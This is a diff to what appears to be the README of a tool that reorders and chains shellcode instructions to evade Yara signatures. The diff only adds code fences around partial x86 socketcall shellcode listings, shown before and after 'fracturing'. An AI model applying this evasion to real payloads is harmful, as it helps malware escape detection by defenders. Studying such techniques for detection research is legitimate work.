@@ -2,7 +2,7 @@
 Reorders and chains shellcode instruction so they evade Yara signatures
 
 ORIGINAL SNIPPET
-
+```
 0:  5b                      pop    ebx
 1:  5e                      pop    esi
 2:  52                      push   edx
@@ -14,9 +14,9 @@ c:  89 e1                   mov    ecx,esp
 e:  6a 66                   push   0x66
 10: 58                      pop    eax
 11: cd 80                   int    0x80
-
+```
 FRACTURED SNIPPET
-
+```
 0:  5b                      pop    ebx
 1:  5e                      pop    esi
 2:  52                      push   edx
@@ -33,4 +33,4 @@ f:  58                      pop    eax
 1c: 89 e1                   mov    ecx,esp
 1e: e9 ea ff ff ff          jmp    0xd
 23: 90                      nop
-
+```
